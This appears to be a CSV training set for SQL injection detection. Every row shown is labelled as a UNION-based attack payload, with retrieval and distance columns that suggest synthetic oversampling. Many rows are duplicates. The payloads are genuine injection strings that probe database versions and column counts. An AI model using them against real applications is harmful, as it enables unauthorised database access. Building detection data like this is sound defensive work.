id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000177,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000161,0.26377872423267884
SMOTE_000178,attack,union," select * from users where id  =  1 +  (  1  )   union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000006,0.30103056582506227
SMOTE_000179,attack,union,"-1447"" union all select 3013,3013,3013,3013,3013,3013,3013--",nearest_attack_euclidean,R000240,0.2155809629465391
SMOTE_000180,attack,union,"-3924'||  (  select 'ssld' from dual where 6229  =  6229 union all select 6229,6229,6229,6229,6229#",nearest_attack_euclidean,R000293,0.029515230161101136
SMOTE_000181,attack,union,"-8893%'  )   union all select 1254,1254--",nearest_attack_euclidean,R000126,0.08062697359419622
SMOTE_000182,attack,union," select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",nearest_attack_euclidean,R000022,0.4266567447739267
SMOTE_000183,attack,union,"-2316%' union all select 8636,8636,8636,8636,8636,8636,8636--",nearest_attack_euclidean,R000255,0.0656623249652069
SMOTE_000184,attack,union,"-7945%'   )    )     )   union all select 4286,4286,4286,4286,4286,4286--",nearest_attack_euclidean,R000119,0.40250169992859824
SMOTE_000185,attack,union,"-2085""  )   as hkev where 7730  =  7730 union all select 7730,7730--",nearest_attack_euclidean,R000121,0.741033464393561
SMOTE_000186,attack,union,"-3667%'   )    )    union all select 3560,3560,3560--",nearest_attack_euclidean,R000222,0.30451371860476806
SMOTE_000187,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000045,0.6327872335383337
SMOTE_000188,attack,union," select * from users where id  =  '1' or $<\ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000057,0.006193941766083178
SMOTE_000189,attack,union,"-3017""   )    )    as ljit where 9128  =  9128 union all select 9128,9128,9128,9128,9128--",nearest_attack_euclidean,R000221,0.25378721469964494
SMOTE_000190,attack,union," select * from users where id  =  1 or 1#""  (   union select version  (    )  ,version  (    )   -- 1",nearest_attack_euclidean,R000051,0.12070278412258569
SMOTE_000191,attack,union,"-3104"" union all select 5717,5717,5717,5717,5717,5717,5717,5717,5717--",nearest_attack_euclidean,R000099,0.14424477791927282
SMOTE_000192,attack,union,"-7611  )   as tuje where 6101  =  6101 union all select 6101,6101,6101,6101,6101,6101,6101,6101--",nearest_attack_euclidean,R000140,0.027585989485763195
SMOTE_000193,attack,union,"-9758'+  (  select 'rlcy' where 3691  =  3691 union all select 3691,3691,3691,3691,3691,3691,3691--",nearest_attack_euclidean,R000279,0.7974895878474918
SMOTE_000194,attack,union,"-3300' union all select 8979,8979,8979,8979,8979,8979--",nearest_attack_euclidean,R000259,0.14838778964548868
SMOTE_000195,attack,union,"-2333' union all select 9714,9714,9714--",nearest_attack_euclidean,R000162,0.33574137088260436
SMOTE_000196,attack,union,-6912' in boolean mode  )   union all select 6012--,nearest_attack_euclidean,R000284,0.44805899800993065
SMOTE_000197,attack,union,"-3361'||  (  select 'msfi' where 4806  =  4806 union all select 4806,4806,4806,4806,4806,4806,4806,4806,4806--",nearest_attack_euclidean,R000213,0.07371648663237715
SMOTE_000198,attack,union," select * from users where id  =  1 or 1#""; union select 'a',version  (    )   -- 1",nearest_attack_euclidean,R000053,6.893535585037461
SMOTE_000199,attack,union,"-7637"" union all select 8498,8498,8498--",nearest_attack_euclidean,R000249,0.0726032290948755
SMOTE_000200,attack,union,"-6125'||  (  select 'hwnm' where 1428  =  1428 union all select 1428,1428,1428,1428,1428,1428#",nearest_attack_euclidean,R000218,0.3363167288076246
SMOTE_000201,attack,union,"-4993"" union all select 6959,6959,6959--",nearest_attack_euclidean,R000241,0.04947098604093765
SMOTE_000202,attack,union,"-7580'   )    )    as mmqt where 3468  =  3468 union all select 3468,3468,3468,3468,3468,3468#",nearest_attack_euclidean,R000155,1.0571455574945534
SMOTE_000203,attack,union,"1' in boolean mode  )   union all select null,null,null,null--",nearest_attack_euclidean,R000176,0.028013322367597977
SMOTE_000204,attack,union,"-3326'+  (  select xitp where 7621  =  7621 union all select 7621,7621,7621,7621,7621,7621,7621,7621,7621,7621#",nearest_attack_euclidean,R000108,0.1704729500683254
SMOTE_000205,attack,union," select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000005,0.28213807861225676
SMOTE_000206,attack,union,"-1150'  )   as hdby where 4032  =  4032 union all select 4032,4032,4032,4032,4032,4032,4032,4032,4032,4032--",nearest_attack_euclidean,R000202,0.4702649805758775
SMOTE_000207,attack,union,"-1985%'   )    )     )   union all select 3051,3051,3051--",nearest_attack_euclidean,R000262,0.4569340590021026
SMOTE_000208,attack,union,"-3343'||  (  select 'ssvt' where 5179  =  5179 union all select 5179,5179,5179,5179,5179,5179,5179,5179--",nearest_attack_euclidean,R000183,0.20752260814468126
SMOTE_000209,attack,union,"-6789'||  (  select 'uckz' from dual where 2163  =  2163 union all select 2163,2163,2163,2163,2163,2163--",nearest_attack_euclidean,R000135,0.616875352268602
SMOTE_000210,attack,union," select * from users where id  =  '1' or $<\. union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000050,0.13193379285265242
SMOTE_000211,attack,union," select * from users where id  =  1 ||1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000012,1.3997080009578926
SMOTE_000212,attack,union," select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",nearest_attack_euclidean,R000022,0.0
SMOTE_000213,attack,union,"-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--",nearest_attack_euclidean,R000305,0.9717599895668576
SMOTE_000214,attack,union,"-2254'  )   as dyrv where 9079  =  9079 union all select 9079,9079,9079,9079,9079,9079,9079,9079#",nearest_attack_euclidean,R000190,0.11032203564469491
SMOTE_000215,attack,union,"-8477' union all select 2517,2517,2517--",nearest_attack_euclidean,R000309,0.4349666166876958
SMOTE_000216,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000197,0.11744437337170509
SMOTE_000217,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R000266,0.5571796951647686
SMOTE_000218,attack,union,"-2254'  )   as dyrv where 9079  =  9079 union all select 9079,9079,9079,9079,9079,9079,9079,9079#",nearest_attack_euclidean,R000190,0.49304962386136486
SMOTE_000219,attack,union,"-9507%"" union all select 3342,3342,3342,3342,3342#",nearest_attack_euclidean,R000270,0.09896180334757407
SMOTE_000220,attack,union,"-5998""  )   as gazd where 2814  =  2814 union all select 2814,2814,2814,2814,2814,2814,2814--",nearest_attack_euclidean,R000277,0.7957015346731444
SMOTE_000221,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000271,0.4107315913508849
SMOTE_000222,attack,union,"-7797'+  (  select oulr where 7091  =  7091 union all select 7091,7091,7091,7091,7091,7091,7091,7091,7091#",nearest_attack_euclidean,R000130,0.12509966223347654
SMOTE_000223,attack,union,"-1676'||  (  select 'xzmu' from dual where 6373  =  6373 union all select 6373,6373--",nearest_attack_euclidean,R000139,0.24164084450286327
SMOTE_000224,attack,union,"-6125'||  (  select 'hwnm' where 1428  =  1428 union all select 1428,1428,1428,1428,1428,1428#",nearest_attack_euclidean,R000218,0.04122670905548225
SMOTE_000225,attack,union,"-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--",nearest_attack_euclidean,R000165,0.2643186156446648
SMOTE_000226,attack,union,"-1269"" union all select 8412,8412,8412,8412,8412,8412,8412,8412--",nearest_attack_euclidean,R000261,0.1967653583278054
SMOTE_000227,attack,union,"-6125'||  (  select 'hwnm' where 1428  =  1428 union all select 1428,1428,1428,1428,1428,1428#",nearest_attack_euclidean,R000218,0.20875840713263316
SMOTE_000228,attack,union," select * from users where id  =  1 *1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000008,0.5743353692593515
SMOTE_000229,attack,union,"-3068%""   )    )    union all select 6597,6597,6597,6597,6597,6597,6597,6597--",nearest_attack_euclidean,R000233,0.6671120910445006
SMOTE_000230,attack,union,"-3498""   )    )    as xbvb where 2056  =  2056 union all select 2056,2056,2056,2056,2056,2056,2056--",nearest_attack_euclidean,R000181,0.07203165550880636
SMOTE_000231,attack,union,"-2855' union all select 2495,2495,2495,2495,2495,2495,2495,2495,2495--",nearest_attack_euclidean,R000287,0.04087750028118287
SMOTE_000232,attack,union,"1' in boolean mode  )   union all select null,null#",nearest_attack_euclidean,R000184,0.1366863453541436
SMOTE_000233,attack,union,"-5217'||  (  select 'juen' from dual where 7336  =  7336 union all select 7336,7336,7336--",nearest_attack_euclidean,R000113,0.1861169002461636
SMOTE_000234,attack,union,"1' in boolean mode  )   union all select null,null,null--",nearest_attack_euclidean,R000134,0.15166735188829197
SMOTE_000235,attack,union,"-2855' union all select 2495,2495,2495,2495,2495,2495,2495,2495,2495--",nearest_attack_euclidean,R000287,0.3895388225829683
SMOTE_000236,attack,union,"-4966%"" union all select 4300,4300,4300,4300,4300,4300,4300,4300#",nearest_attack_euclidean,R000128,0.4882884849779738
SMOTE_000237,attack,union,"-4869%' union all select 5729,5729,5729--",nearest_attack_euclidean,R000300,0.4914675674452349
SMOTE_000238,attack,union,"-4136'   )    )    as cczp where 7052  =  7052 union all select 7052,7052,7052,7052,7052,7052,7052,7052,7052,7052#",nearest_attack_euclidean,R000158,0.6831927092526098
SMOTE_000239,attack,union,"-4876""   )    )    as saug where 2256  =  2256 union all select 2256,2256,2256,2256,2256,2256,2256,2256,2256,2256--",nearest_attack_euclidean,R000256,0.4433303218097691
SMOTE_000240,attack,union,"-4993"" union all select 6959,6959,6959--",nearest_attack_euclidean,R000241,0.40810728636660465
SMOTE_000241,attack,union,"-7111%"" union all select 6083,6083,6083,6083,6083,6083--",nearest_attack_euclidean,R000170,0.7500829756152572
SMOTE_000242,attack,union,-6912' in boolean mode  )   union all select 6012--,nearest_attack_euclidean,R000284,0.17713397176922688
SMOTE_000243,attack,union,"-3781%'  )   union all select 7497,7497,7497,7497,7497--",nearest_attack_euclidean,R000258,0.07903512646519471
SMOTE_000244,attack,union,"-7848%"" union all select 1580,1580,1580,1580,1580,1580,1580--",nearest_attack_euclidean,R000211,0.0014472589155110163
SMOTE_000245,attack,union,"-2625""   )    )    as qfuo where 1980  =  1980 union all select 1980,1980,1980--",nearest_attack_euclidean,R000295,0.01833233268813938
SMOTE_000246,attack,union,"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",nearest_attack_euclidean,R000306,0.03782490681008752
SMOTE_000247,attack,union," select * from users where id  =  '1' ||1 union select 1,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000018,0.10730343348491755
SMOTE_000248,attack,union,"-5300' union all select 2750,2750,2750,2750,2750,2750--",nearest_attack_euclidean,R000133,0.34800003812505004
SMOTE_000249,attack,union,"-4966%"" union all select 4300,4300,4300,4300,4300,4300,4300,4300#",nearest_attack_euclidean,R000128,0.9498596891617885
SMOTE_000250,attack,union,"-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#",nearest_attack_euclidean,R000200,0.21471978447140022
SMOTE_000251,attack,union," select * from users where id  =  '1' + @ 1! union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000069,0.4944922174514255
SMOTE_000252,attack,union,"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",nearest_attack_euclidean,R000275,0.6299656799808474
SMOTE_000253,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000045,0.35156144172475234
SMOTE_000254,attack,union," select * from users where id  =  1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000007,0.15726625394719773
SMOTE_000255,attack,union,"1'||  (  select 'ybfo' from dual where 3319  =  3319 union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000199,0.06173779900599017
SMOTE_000256,attack,union,-4768'||  (  select 'dded' from dual where 6499  =  6499 union all select 6499--,nearest_attack_euclidean,R000260,0.3392429460858422
SMOTE_000257,attack,union," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000019,1.386818478400824
SMOTE_000258,attack,union,"-7627%""   )    )    union all select 4011,4011,4011,4011,4011,4011,4011,4011,4011,4011--",nearest_attack_euclidean,R000286,0.5235352112313939
SMOTE_000259,attack,union,"-2153'||  (  select 'sofs' where 4126  =  4126 union all select 4126,4126,4126,4126,4126#",nearest_attack_euclidean,R000225,0.18224323564863565
SMOTE_000260,attack,union,"-5054%""   )    )     )   union all select 8263,8263,8263,8263--",nearest_attack_euclidean,R000290,0.08636619007774972
SMOTE_000261,attack,union,"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",nearest_attack_euclidean,R000275,0.5561201630414528
SMOTE_000262,attack,union,"-7815' union all select 2638,2638,2638,2638,2638--",nearest_attack_euclidean,R000252,0.0017274047060150438
SMOTE_000263,attack,union,"-4136'   )    )    as cczp where 7052  =  7052 union all select 7052,7052,7052,7052,7052,7052,7052,7052,7052,7052#",nearest_attack_euclidean,R000158,1.2089935514774928
SMOTE_000264,attack,union,"-8566""  )   as hnch where 3418  =  3418 union all select 3418,3418,3418,3418,3418,3418,3418#",nearest_attack_euclidean,R000082,0.48747579357244525
SMOTE_000265,attack,union,"-7485""   )    )    as caob where 4100  =  4100 union all select 4100,4100,4100,4100,4100,4100,4100,4100--",nearest_attack_euclidean,R000116,0.7139021495966285
SMOTE_000266,attack,union," select * from users where id  =  '1' or \.<\ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000003,0.004727287064420778
SMOTE_000267,attack,union," select * from users where id  =  '1' or \.<   =  1 union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000033,0.009812398857467508
SMOTE_000268,attack,union," select * from users where id  =  1 +$+. union select null,@@VERSION -- 1",nearest_attack_euclidean,R000052,1.1217584557776594
SMOTE_000269,attack,union,"-1998'  )   as kgvf where 2346  =  2346 union all select 2346,2346,2346,2346,2346,2346,2346,2346,2346--",nearest_attack_euclidean,R000109,0.058231282826284377
SMOTE_000270,attack,union,"-4876""   )    )    as saug where 2256  =  2256 union all select 2256,2256,2256,2256,2256,2256,2256,2256,2256,2256--",nearest_attack_euclidean,R000256,0.9220222946158533
SMOTE_000271,attack,union,"-8982'+  (  select anyd where 5358  =  5358 union all select 5358,5358,5358,5358,5358,5358#",nearest_attack_euclidean,R000276,0.3478076291525793
SMOTE_000272,attack,union,"-2254'  )   as dyrv where 9079  =  9079 union all select 9079,9079,9079,9079,9079,9079,9079,9079#",nearest_attack_euclidean,R000190,0.37580796186371024
SMOTE_000273,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000060,1.589421147181338
SMOTE_000274,attack,union,"-9848' union all select 1359,1359,1359,1359,1359,1359,1359,1359,1359,1359--",nearest_attack_euclidean,R000193,0.2543591521330024
SMOTE_000275,attack,union,"-6597'+  (  select aewz where 4036  =  4036 union all select 4036,4036,4036,4036,4036,4036,4036--",nearest_attack_euclidean,R000091,0.12695990711191138
SMOTE_000276,attack,union,"-5524  )   as eoyk where 6928  =  6928 union all select 6928,6928,6928,6928,6928,6928,6928,6928,6928--",nearest_attack_euclidean,R000098,0.060070692272135
SMOTE_000277,attack,union,"-5058%' union all select 6789,6789,6789,6789,6789#",nearest_attack_euclidean,R000141,1.4738033801435049
SMOTE_000278,attack,union,"-7111%"" union all select 6083,6083,6083,6083,6083,6083--",nearest_attack_euclidean,R000170,0.08526601464495741
SMOTE_000279,attack,union," select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",nearest_attack_euclidean,R000022,0.0
SMOTE_000280,attack,union,"1' in boolean mode  )   union all select null,null,null,null--",nearest_attack_euclidean,R000176,0.019201575631531714
SMOTE_000281,attack,union,"-2254'  )   as dyrv where 9079  =  9079 union all select 9079,9079,9079,9079,9079,9079,9079,9079#",nearest_attack_euclidean,R000190,0.5027009261060821
SMOTE_000282,attack,union,"-6186' in boolean mode  )   union all select 2990,2990,2990#",nearest_attack_euclidean,R000267,0.27361292293370787
SMOTE_000283,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000161,0.39758378623077595
SMOTE_000284,attack,union," select * from users where id  =  1 or 1#"". union select 'a',version  (    )   -- 1",nearest_attack_euclidean,R000009,7.767487445076162
SMOTE_000285,attack,union,"-1055' union all select 7758,7758,7758,7758,7758,7758--",nearest_attack_euclidean,R000216,0.39229170922509066
SMOTE_000286,attack,union,"-4452%"" union all select 7141,7141,7141,7141,7141,7141,7141,7141--",nearest_attack_euclidean,R000264,0.5476409328893452
SMOTE_000287,attack,union," select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",nearest_attack_euclidean,R000022,0.6406219024320399
SMOTE_000288,attack,union,"-7016%""   )    )    union all select 8847,8847,8847--",nearest_attack_euclidean,R000246,0.16618424835397452
SMOTE_000289,attack,union,"-6987' union all select 4721,4721--",nearest_attack_euclidean,R000244,0.7923081658415589
SMOTE_000290,attack,union," select * from users where id  =  '1' or \.<\ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000003,0.049619493471364295
SMOTE_000291,attack,union,"-5866'   )    )    as phzq where 3803  =  3803 union all select 3803,3803,3803,3803,3803,3803,3803,3803--",nearest_attack_euclidean,R000166,0.6791641446664062
SMOTE_000292,attack,union,"-6294"" union all select 9921,9921,9921,9921,9921,9921--",nearest_attack_euclidean,R000194,0.12348881664665172
SMOTE_000293,attack,union," select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",nearest_attack_euclidean,R000022,0.652951838724286
SMOTE_000294,attack,union," select * from users where id  =  1. union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000049,0.17479556010345612
SMOTE_000295,attack,union,"-4966%"" union all select 4300,4300,4300,4300,4300,4300,4300,4300#",nearest_attack_euclidean,R000128,0.35669516494684284
SMOTE_000296,attack,union,"-2855' union all select 2495,2495,2495,2495,2495,2495,2495,2495,2495--",nearest_attack_euclidean,R000287,0.2844997981639289
SMOTE_000297,attack,union,"-3620'||  (  select 'kmei' where 8533  =  8533 union all select 8533,8533,8533,8533--",nearest_attack_euclidean,R000207,0.18776022876928827
SMOTE_000298,attack,union,"-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#",nearest_attack_euclidean,R000081,0.32384867196138895
SMOTE_000299,attack,union," select * from users where id  =  '1' or \.<\ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000003,0.1893772129252234
SMOTE_000300,attack,union,"-8069   )    )    as sxbn where 7689  =  7689 union all select 7689,7689,7689,7689,7689,7689,7689,7689,7689,7689--",nearest_attack_euclidean,R000224,1.153898146069797
SMOTE_000301,attack,union,"-8758' union all select 6885,6885,6885,6885,6885,6885,6885,6885--",nearest_attack_euclidean,R000254,0.19517271157489366
SMOTE_000302,attack,union,"-9583%""   )    )    union all select 9349,9349,9349,9349,9349,9349,9349--",nearest_attack_euclidean,R000177,0.030643358813648647
SMOTE_000303,attack,union,"-2549'  )   as zfnf where 1993  =  1993 union all select 1993,1993,1993,1993,1993,1993--",nearest_attack_euclidean,R000138,0.14669922663409257
SMOTE_000304,attack,union,"-4947' in boolean mode  )   union all select 3314,3314#",nearest_attack_euclidean,R000132,1.394713947047798
SMOTE_000305,attack,union,-4058  )   union all select 9184--,nearest_attack_euclidean,R000173,0.807866124363968
SMOTE_000306,attack,union,"-5520%"" union all select 5235,5235,5235,5235,5235,5235,5235,5235,5235,5235--",nearest_attack_euclidean,R000088,1.8534765081305964
SMOTE_000307,attack,union,"-5217'||  (  select 'juen' from dual where 7336  =  7336 union all select 7336,7336,7336--",nearest_attack_euclidean,R000113,0.11501431617507395
SMOTE_000308,attack,union,"-3822""   )    )    as dftp where 2817  =  2817 union all select 2817,2817,2817,2817,2817,2817#",nearest_attack_euclidean,R000251,0.8459897013233906
SMOTE_000309,attack,union,"-1218' union all select 2663,2663,2663,2663--",nearest_attack_euclidean,R000144,0.148876154222667
SMOTE_000310,attack,union,"-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--",nearest_attack_euclidean,R000093,0.45029545839935503
SMOTE_000311,attack,union,"-3300' union all select 8979,8979,8979,8979,8979,8979--",nearest_attack_euclidean,R000259,0.039348818507070865
SMOTE_000312,attack,union,"-3462   )    )    as biyl where 5143  =  5143 union all select 5143,5143,5143--",nearest_attack_euclidean,R000114,0.23639326159489912
SMOTE_000313,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R000219,0.2773710935865369
SMOTE_000314,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000060,0.8160612796953624
SMOTE_000315,attack,union,"-2316%' union all select 8636,8636,8636,8636,8636,8636,8636--",nearest_attack_euclidean,R000255,0.2646345428361719
SMOTE_000316,attack,union," select * from users where id  =  1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000007,0.04234968997029776
SMOTE_000317,attack,union,"-5217'||  (  select 'juen' from dual where 7336  =  7336 union all select 7336,7336,7336--",nearest_attack_euclidean,R000113,0.35124849551778164
SMOTE_000318,attack,union,"-9758'+  (  select 'rlcy' where 3691  =  3691 union all select 3691,3691,3691,3691,3691,3691,3691--",nearest_attack_euclidean,R000279,0.008790757416115189
SMOTE_000319,attack,union,"-1597"" union all select 6038,6038,6038,6038,6038,6038,6038,6038,6038,6038--",nearest_attack_euclidean,R000112,0.23775038819446423
SMOTE_000320,attack,union,"-6680%""   )    )    union all select 3719,3719,3719,3719,3719,3719,3719,3719,3719--",nearest_attack_euclidean,R000281,0.46647425315866503
SMOTE_000321,attack,union,"-8477' union all select 2517,2517,2517--",nearest_attack_euclidean,R000309,0.7000868350691252
SMOTE_000322,attack,union," select * from users where id  =  1. union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000049,0.14497701162807322
SMOTE_000323,attack,union,"-2625""   )    )    as qfuo where 1980  =  1980 union all select 1980,1980,1980--",nearest_attack_euclidean,R000295,0.04558858746522137
SMOTE_000324,attack,union,"-3822""   )    )    as dftp where 2817  =  2817 union all select 2817,2817,2817,2817,2817,2817#",nearest_attack_euclidean,R000251,0.3042570088700045
SMOTE_000325,attack,union,"-6186' in boolean mode  )   union all select 2990,2990,2990#",nearest_attack_euclidean,R000267,0.1533779332040845
SMOTE_000326,attack,union,"-1150'  )   as hdby where 4032  =  4032 union all select 4032,4032,4032,4032,4032,4032,4032,4032,4032,4032--",nearest_attack_euclidean,R000202,0.9014021265543093
SMOTE_000327,attack,union,"-4694%""   )    )     )   union all select 9178,9178,9178,9178,9178--",nearest_attack_euclidean,R000226,0.19597945210999157
SMOTE_000328,attack,union," select * from users where id  =  1. union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000049,0.33450752785256416
SMOTE_000329,attack,union,"-3997'+  (  select 'avjk' where 1917  =  1917 union all select 1917,1917,1917--",nearest_attack_euclidean,R000236,0.07830969657873177
SMOTE_000330,attack,union,"-3781%'  )   union all select 7497,7497,7497,7497,7497--",nearest_attack_euclidean,R000258,0.759666257365534
SMOTE_000331,attack,union,"-1512"" union all select 9688,9688,9688,9688,9688,9688,9688,9688,9688,9688--",nearest_attack_euclidean,R000208,0.019609159817616243
SMOTE_000332,attack,union,"-2855' union all select 2495,2495,2495,2495,2495,2495,2495,2495,2495--",nearest_attack_euclidean,R000287,0.04100730176280807
SMOTE_000333,attack,union,"-7725%'   )    )    union all select 4559,4559,4559,4559,4559,4559,4559,4559,4559--",nearest_attack_euclidean,R000312,0.8375475028275918
SMOTE_000334,attack,union," select * from users where id  =  '1' or \.<\ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000003,0.27018258284600005
SMOTE_000335,attack,union,"-7797'+  (  select oulr where 7091  =  7091 union all select 7091,7091,7091,7091,7091,7091,7091,7091,7091#",nearest_attack_euclidean,R000130,0.797116144224861
SMOTE_000336,attack,union,"-3361'||  (  select 'msfi' where 4806  =  4806 union all select 4806,4806,4806,4806,4806,4806,4806,4806,4806--",nearest_attack_euclidean,R000213,0.5950646569989455
SMOTE_000337,attack,union,"-6125'||  (  select 'hwnm' where 1428  =  1428 union all select 1428,1428,1428,1428,1428,1428#",nearest_attack_euclidean,R000218,0.10425863465611356
SMOTE_000338,attack,union," select * from users where id  =  '1' + @ 1! union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000069,0.29718790678777757
SMOTE_000339,attack,union,"-4694%""   )    )     )   union all select 9178,9178,9178,9178,9178--",nearest_attack_euclidean,R000226,0.327822394446047
SMOTE_000340,attack,union,"-7580'   )    )    as mmqt where 3468  =  3468 union all select 3468,3468,3468,3468,3468,3468#",nearest_attack_euclidean,R000155,0.34506283597738807
SMOTE_000341,attack,union," select * from users where id  =  1 + @<@# union select null,version  (    )   -- 1",nearest_attack_euclidean,R000055,1.416296348112399
SMOTE_000342,attack,union,"-9848' union all select 1359,1359,1359,1359,1359,1359,1359,1359,1359,1359--",nearest_attack_euclidean,R000193,0.16597027547445142
SMOTE_000343,attack,union,"-8772%' union all select 4909,4909,4909,4909,4909,4909,4909,4909,4909#",nearest_attack_euclidean,R000115,1.7927751699188401
SMOTE_000344,attack,union,"-1676'||  (  select 'xzmu' from dual where 6373  =  6373 union all select 6373,6373--",nearest_attack_euclidean,R000139,0.09894616808950045
SMOTE_000345,attack,union,-6912' in boolean mode  )   union all select 6012--,nearest_attack_euclidean,R000284,0.9096673989061183
SMOTE_000346,attack,union,"-2316%' union all select 8636,8636,8636,8636,8636,8636,8636--",nearest_attack_euclidean,R000255,0.047693397000308654
SMOTE_000347,attack,union,"-3667%'   )    )    union all select 3560,3560,3560--",nearest_attack_euclidean,R000222,0.41552419145546665
SMOTE_000348,attack,union,"-7378' union all select 2071,2071,2071,2071,2071,2071,2071--",nearest_attack_euclidean,R000196,0.2701297126371617
SMOTE_000349,attack,union," select * from users where id  =  '1' or @ @1  =  1 union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000001,1.5563466012162543
SMOTE_000350,attack,union," select * from users where id  =  '1' + @ 1! union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000069,0.005108136269323829
SMOTE_000351,attack,union,"-1634%' union all select 5937,5937,5937,5937--",nearest_attack_euclidean,R000248,0.44575321635644344
SMOTE_000352,attack,union,"-7378' union all select 2071,2071,2071,2071,2071,2071,2071--",nearest_attack_euclidean,R000196,0.0439325659803298
SMOTE_000353,attack,union," select * from users where id  =  1 or 1#""; union select 'a',version  (    )   -- 1",nearest_attack_euclidean,R000053,0.38022156072343694
SMOTE_000354,attack,union,"-7813""   )    )    as yvyl where 5172  =  5172 union all select 5172,5172#",nearest_attack_euclidean,R000072,1.1226290803271781
SMOTE_000355,attack,union,"-4966%"" union all select 4300,4300,4300,4300,4300,4300,4300,4300#",nearest_attack_euclidean,R000128,1.5785941871845597
SMOTE_000356,attack,union,"-4586'  )   as shdb where 6176  =  6176 union all select 6176,6176,6176,6176#",nearest_attack_euclidean,R000163,0.685856022889938
SMOTE_000357,attack,union," select * from users where id  =  1   union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000024,0.07739770369246644
SMOTE_000358,attack,union,"-7138"" union all select 2341,2341,2341,2341--",nearest_attack_euclidean,R000245,0.36079602100756086
